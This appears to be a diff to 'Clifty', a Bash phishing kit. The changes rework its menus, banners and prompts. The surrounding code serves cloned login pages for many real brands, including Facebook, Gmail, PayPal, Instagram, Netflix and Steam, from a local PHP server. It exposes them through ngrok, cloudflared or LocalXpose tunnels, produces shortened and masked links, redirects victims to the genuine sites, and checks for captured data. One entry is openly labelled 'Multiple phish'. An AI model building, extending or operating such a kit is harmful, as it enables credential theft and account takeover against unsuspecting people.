@@ -138,7 +138,7 @@ banner(){
 	echo -e "${MAGENTA}|        ${BLUE}██║     ██║     ██║██╔══╝     ██║     ╚██╔╝        ${MAGENTA}|${NC}"
 	echo -e "${MAGENTA}|        ${BLUE}╚██████╗███████╗██║██║        ██║      ██║         ${MAGENTA}|${NC}"
 	echo -e "${MAGENTA}|        ${BLUE} ╚═════╝╚══════╝╚═╝╚═╝        ╚═╝      ╚═╝         ${MAGENTA}|${NC}"
-	echo -e "${MAGENTA}---------------------------------------------------------------${NC}"
+	echo -e "${MAGENTA}-------------------------------------------------------------${NC}"
         echo -e ""
 }
 # Credits banner
@@ -151,7 +151,7 @@ cbanner(){
 	echo -e "${MAGENTA}|        ${BLUE}██║     ██║     ██║██╔══╝     ██║     ╚██╔╝        ${MAGENTA}|${NC}"
 	echo -e "${MAGENTA}|        ${BLUE}╚██████╗███████╗██║██║        ██║      ██║         ${MAGENTA}|${NC}"
 	echo -e "${MAGENTA}|        ${BLUE} ╚═════╝╚══════╝╚═╝╚═╝        ╚═╝      ╚═╝         ${MAGENTA}|${NC}"
-	echo -e "${MAGENTA}---------------------------------------------------------------${NC}"
+	echo -e "${MAGENTA}-------------------------------------------------------------${NC}"
 	echo -e "${BOLDBLUE}           ᴠᴇʀsɪᴏɴ 1.4               ＢＹ －ＡＬＹＧＮＴ           ${NC}"
         echo -e ""
 }
@@ -426,8 +426,10 @@ ngrok_token_setup(){
 	start_ngrok
 }
 ngrok_region() {
+        echo -e "${ULWHITE}${BOLDWHITE}ENTER YOUR PREFERED REGION : ${NF} : ${NC}"
         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter prefered region (Default=us) : "
-	read -p "${GREEN}   (Example: us eu au ap sa jp in) : " ngrokregion
+        temprompt="$(echo -e "    ${GREEN}(Example: us eu au ap sa jp in)${NC} :")"
+	read -p "${temprompt}" ngrokregion
 	case $ngrokregion in
 	"us" | "US")
 		ngrokregion="us";;
@@ -445,32 +447,30 @@ ngrok_region() {
 		ngrokregion="in";;
 	*)
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Tryagain"
-		sleep 5
-		clear
-		banner
+		{ sleep 5; clear; banner; echo -e ""}
 		ngrok_region;;
 	esac
 }
 ## Start ngrok
 start_ngrok() {
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
-        { sleep 1; setup_site; }
+        { setup_site; clear; banner; echo -e ""}
 	echo -e "\n"
 	ngrokregion="us"
-        read -p "${RED}[${WHITE}-${RED}]${GREEN} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] : ${YELLOW} " reply
+        temprompt="$(echo -e "${ULWHITE}${BOLDWHITE}CHANGE NGROK SERVER REGION : ${NF} : ${NC}")"
+	read -p "${temprompt}"
 	case $reply in
-	Y | y)
+	1 | Y | y | yes | Yes | YES)
 		ngrok_region;;
-	N | n | *)
+	*)
 		echo -e " ";;
 	esac
         #load_print "Launching NGROK" '15'
         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
-    if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
-    else
-        sleep 2 && ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
-    fi
+        if [[ `command -v termux-chroot` ]]; then
+                sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
+        else
+                sleep 2 && ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
+        fi
 	sleep 15
 	fetchlink_ngrok
 	checklink
@@ -511,16 +511,15 @@ install_cloudflared() {
 }
 ## Start Cloudflared
 start_cloudflared() {
+        { setup_site; clear; banner; echo -e ""}
         rm .cld.log > /dev/null 2>&1 &
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
-        { sleep 1; setup_site; }
         echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
-    if [[ `command -v termux-chroot` ]]; then
+        if [[ `command -v termux-chroot` ]]; then
                 sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
-    else
-        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
-    fi
+        else
+                sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+        fi
 	sleep 15
 	fetchlink_cloudflared
 	checklink
@@ -580,8 +579,7 @@ token_localxpose() {
 }
 ## Start LocalXpose
 start_loclx() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
-	{ sleep 1; setup_site; }
+	{ setup_site; clear; banner; echo -e ""}
 	echo -e "\n"
 	read -n1 -p "${RED}[${WHITE}-${RED}]${YELLOW} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] : ${YELLOW} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
@@ -642,23 +640,44 @@ start_localhost() {
 #Host and port setup
 HOST='127.0.0.1'
 cusport() {
-	echo -e " "
-	echo -e "${RED}[${WHITE}-${RED}]${GREEN}Your current port : ${BLUE}4444"
-	read -p "${RED}[${WHITE}?${RED}]${YELLOW}Do you want to setup Custom port (Y/n) : ${BLUE}"
+        { clear; banner; }
+        echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
+        echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
+        echo -e ""
+        echo -e ""
+        echo -e "${ULWHITE}${BOLDWHITE}DO YOU WANT TO SETUP CUSTOM PORT ${NF} : ${NC}"
+        echo -e "   ${GREEN}Current port : ${BLUE}${PORT}${NA}"   
+        echo -e ""
+        echo -e ""
+        echo -e "${BLUE}[1/Y/y]  ${CYAN} YES ${NC}"
+        echo -e "${BLUE}[2/N/n/*]${CYAN} NO ${NC}"
+        echo -e ""
+        selected="Clifty/${siname}/${sitype}/${tutype}"
+        uprompt;read -p "${prompt}"
 	case $REPLY in
-	Y | y)
-		read -p "${RED}[${WHITE}?${RED}]${YELLOW}Type your Custom port : ${BLUE}" cport
+	1 | Y | y | yes | Yes | YES)
+                temprompt="$(echo -e "${ULWHITE}${BOLDWHITE}TYPE YOUR CUSTOM PORT ${NF} : ${NC}")"
+		read -p "${temprompt}" cport
 		PORT="${cport}";;
-
-	N | n | *)
-		PORT="4444";;
 	*)
 		PORT="4444";;
 	esac
 }
 ## Setup website and start php server
 setup_site() {
-        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+        { clear; banner; }
+        echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
+        echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
+        echo -e ""
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
+        sleep 1
+        echo -e "\n${RED}[${WHITE}-${RED}]${ULBLUE} SETTING UP SERVER....${NA}"
         cp -rf ${sites_dir}/"$website"/* .server/www
 	if [ -e "${assets_dir}/ip.php" ]; then
 		cp ${assets_dir}/ip.php ${sites_dir}/"$website"/* .server/www
@@ -674,28 +693,45 @@ setup_site() {
 		mv index.php ${assets_dir}
 		cp ${assets_dir}/index.php ${sites_dir}/"$website"/* .server/www
 	fi
+        cusport
         redirect_check
-	cusport
+        { clear; banner; echo -e ""}
         echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
         cd ${www_dir} && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
 ## Redirect
 redirect_check(){
-     echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Current Redirect Url : ${rdurl} "   
-     echo -e "\n"
-     read -p "${RED}[${WHITE}?${RED}]${BLUE} Do you want to change redirect URL (Y/n) : ${BLUE}"
-		case $REPLY in
-                Y | y)
+        { clear; banner; }
+        echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
+        echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${ULMAGENTA}${BOLDMAGENTA}${PORT}${NA}"
+        echo -e ""
+        echo -e ""
+        echo -e "${ULWHITE}${BOLDWHITE}DO YOU WANT TO CHANGE REDIRECT URL ${NF} : ${NC}"
+        echo -e "   ${GREEN}Current Redirect Url : ${BLUE}${rdurl}${NA}"   
+        echo -e ""
+        echo -e ""
+        echo -e "${BLUE}[1/Y/y]  ${CYAN} YES ${NC}"
+        echo -e "${BLUE}[2/N/n/*]${CYAN} NO ${NC}"
+        echo -e ""
+        selected="Clifty/${siname}/${sitype}/${tutype}"
+        uprompt;read -p "${prompt}" rdchoice
+		case $rdchoice in
+                1 | Y | y | yes | Yes | YES)
   	                redirect_input;;
-                N | n | *)
-                        echo -e ""
+                *)
+                        rdurl=${urdurl}
                         redirect_default;;
 	        esac
 }
 redirect_input() {
-        echo"\n"
-        read -p "${RED}[${WHITE}?${RED}]${YELLOW} Your Redirect URL : ${BLUE}" urdurl
+        echo -e "\n"
+        echo -e "${ULWHITE}${BOLDWHITE}TYPE YOUR REDIRECT URL ${NF} : ${NC}"
+        read -p " " urdurl
         if [[ "${urdurl//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
 		echo -e "${RED}[${WHITE}!${RED}]${RED} Don't type http or https in the URL"
                 sleep 3
@@ -856,8 +892,15 @@ shorten_tinyurl() {
 
 ## Display link
 displaylocalhost(){
-	clear
-	sbanner
+        { clear; sbanner; echo -e ""; }
+        echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
+        echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${ULMAGENTA}${BOLDMAGENTA}${PORT}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}REDIRECT${NA} : ${ULMAGENTA}${BOLDMAGENTA}${rdurl}${NA}"
+        echo -e ""
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} LOCALHOST URL : ${GREEN}http://${HOST}:${PORT}"
 }
 displaylink(){
@@ -876,7 +919,6 @@ displayshortlink() {
 	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  4 : ${GREEN}${masked_shortcode_url3}"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 5 : ${GREEN}${final_tinyurl_url}"
 	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  5 : ${GREEN}${masked_tinyurl_url}"
-	echo -e "\n${RED}[${WHITE}#${RED}]${BLUE}If above link is empty just ignore it, Use the generated link"
 	capture_data_check
 }
 
@@ -1161,7 +1203,6 @@ read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a choice : ${BLUE}" reply_logs_m
 tunnelmenu() {
 clear
 banner
-echo -e " "
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1197,7 +1238,6 @@ uprompt;read -p "${prompt}" tuchoice
 
 mainmenu() {
 banner
-echo -e " "
 userip; echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 check_netstats; echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e " "
@@ -1394,7 +1434,7 @@ esac
 site_adobe(){
 siname="Adobe"
 rdurl="www.adobe.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1433,7 +1473,7 @@ tunnelmenu
 site_airtelxstream(){
 siname="AirtelXStream"
 rdurl="www.airtelxstream.in"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1464,7 +1504,7 @@ esac
 site_ajio(){
 siname="AJIO"
 rdurl="www.ajio.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1495,7 +1535,7 @@ esac
 site_amazon(){
 siname="Amazon"
 rdurl="www.amazon.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1526,7 +1566,7 @@ esac
 site_apple(){
 siname="Apple"
 rdurl="www.apple.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1557,7 +1597,7 @@ esac
 site_badoo(){
 siname="Badoo"
 rdurl="badoo.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1596,7 +1636,7 @@ tunnelmenu
 site_date(){
 siname="Date (Multiple phish)"
 rdurl="date.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1637,7 +1677,7 @@ esac
 site_devianart(){
 siname="Devian Art"
 rdurl="www.deviantart.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1675,7 +1715,7 @@ tunnelmenu
 site_ebay(){
 siname="Ebay"
 rdurl="www.ebay.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1706,7 +1746,7 @@ esac
 site_facebook(){
 siname="Facebook"
 rdurl="www.facebook.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1762,7 +1802,7 @@ esac
 site_flipcart(){
 siname="Flipcart"
 rdurl="www.flipcart.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1800,7 +1840,7 @@ tunnelmenu
 site_github(){
 siname="GitHub"
 rdurl="www.github.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1841,7 +1881,7 @@ esac
 site_gitlab(){
 siname="GitLab"
 rdurl="www.gitlab.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1882,7 +1922,7 @@ esac
 site_gmail(){
 siname="Gmail"
 rdurl="www.gmail.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1913,7 +1953,7 @@ esac
 site_google(){
 siname="Google"
 rdurl="www.gmail.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1964,7 +2004,7 @@ esac
 site_gpay(){
 siname="Gpay"
 rdurl="pay.google.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2002,7 +2042,7 @@ tunnelmenu
 site_instagram(){
 siname="Instagram"
 rdurl="www.instagram.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2091,7 +2131,7 @@ tunnelmenu
 site_jio(){
 siname="JIO"
 rdurl="www.jio.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2122,7 +2162,7 @@ esac
 site_linkedin(){
 siname="Linkedin"
 rdurl="linkedin.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2153,7 +2193,7 @@ esac
 site_mediafire(){
 siname="Medifire"
 rdurl="www.mediafire.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2184,7 +2224,7 @@ esac
 site_messenger(){
 siname="Messenger"
 rdurl="www.messenger.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2225,7 +2265,7 @@ esac
 site_microsoft(){
 siname="Microsoft"
 rdurl="www.microsoft.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2264,7 +2304,7 @@ tunnelmenu
 site_myspace(){
 siname="MySpace"
 rdurl="myspace.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2295,7 +2335,7 @@ esac
 site_netflix(){
 siname="Netflix"
 rdurl="www.netflix.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2342,7 +2382,7 @@ tunnelmenu
 site_paypal(){
 siname="Paypal"
 rdurl="www.paypal.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2373,7 +2413,7 @@ esac
 site_paytm(){
 siname="Paytm"
 rdurl="paytm.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2430,7 +2470,7 @@ tunnelmenu
 site_playstation(){
 siname="PlayStation"
 rdurl="www.playstation.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2506,7 +2546,7 @@ tunnelmenu
 site_reddit(){
 siname="Reddit"
 rdurl="www.reddit.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2537,7 +2577,7 @@ esac
 site_shopify(){
 siname="Shopify"
 rdurl="www.shopify.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2568,7 +2608,7 @@ esac
 site_snapchat(){
 siname="Snapchat"
 rdurl="www.snapchat.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2599,7 +2639,7 @@ esac
 site_socialclub(){
 siname="SocialClub"
 rdurl="socialclub.rockstargames.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2630,7 +2670,7 @@ esac
 site_spotify(){
 siname="Spotify"
 rdurl="www.spotify.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2661,7 +2701,7 @@ esac
 site_stackoverflow(){
 siname="Stackoverflow"
 rdurl="stackoverflow.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2692,7 +2732,7 @@ esac
 site_steam(){
 siname="Steam"
 rdurl="store.steampowered.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2747,7 +2787,7 @@ tunnelmenu
 site_tiktok(){
 siname="TikTok"
 rdurl="www.tiktok.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
